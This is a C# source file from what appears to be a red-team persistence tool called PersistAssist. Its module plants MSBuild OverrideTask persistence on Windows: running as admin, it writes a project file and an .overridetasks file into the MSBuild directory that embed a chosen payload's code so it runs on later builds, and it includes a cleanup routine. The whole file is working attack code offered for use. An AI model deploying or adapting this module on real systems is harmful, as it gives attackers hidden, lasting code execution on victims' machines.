using System;
using System.IO;
using System.Linq;

using PersistAssist.Utils;
using PersistAssist.Models;

using static PersistAssist.Utils.MSBuildOps;
using static PersistAssist.Models.Data.Enums;
using static PersistAssist.Models.Data.Lists;

namespace PersistAssist.Functions
{
    public class OverrideTasks : Persist
    {
        public override string PersistName => "OverrideTask";

        public override string PersistDesc => "Deploys MSBuild OverrideTask based persistence. Drops file to disk and requires admin access";

        public override string PersistUsage => "\n\tPersist: PersistAssist.exe -t OverrideTask -p -tn [task name] -pl [payload]\n" +
            "\tCleanup: PeristAssist.exe -t OverrideTask -c -tn [task name]";

        public override PersistType PersistCategory => PersistType.MSBuild;

        public override string PersistExec(ParsedArgs pArgs)
        {
            try {
                if (!Extensions.isAdmin()) { throw new PersistAssistException("Must be running as Admin to perform this technique"); }
                if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("Incorrect parameters passed. See technique usage"); }

                Payload payload = _payloads.FirstOrDefault(cPayload => cPayload.PayloadName.Equals(pArgs.Payload, StringComparison.InvariantCultureIgnoreCase));
                if (payload is null) { throw new PersistAssistException($"Payload {payload} doesn't exist"); }

                File.WriteAllText($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj", GenTask(pArgs.TaskName));
                File.WriteAllText($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks", GenOverride(pArgs.TaskName, payload.PayloadNamespaces, payload.PayloadCode));

                if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks")) {
                    return $"MSBuild Override Task successfully deployed\n" +
                        $"override file path: {MSBuildPath}\\{pArgs.TaskName}.overridetasks";
                } else { return "MSBuild Override Task failed to deploy"; }

            } catch (Exception e) { return $"PersistAssist module failed: {e.Message}"; }
        }

        public override string PersistCleanup(ParsedArgs pArgs)
        {
            try {
                if (!Extensions.isAdmin()) { throw new PersistAssistException("Must be running as Admin to perform this technique"); }
                if (pArgs.TaskName.isEmpty() || pArgs.Payload.isEmpty()) { throw new PersistAssistException("Incorrect parameters passed. See technique usage"); }

                File.Delete($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj");
                File.Delete($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks");

                if (File.Exists($"{Directory.GetCurrentDirectory()}\\{pArgs.TaskName}.csproj") && File.Exists($"{MSBuildPath}\\{pArgs.TaskName}.overridetasks")) {
                    return "Failed to cleanup MSBuild Override task";
                } else { return "Successfully cleaned up MSBuild Override task"; }
            } catch (Exception e) { return $"PersistAssist module failed: {e.Message}"; }
        }
    }
}
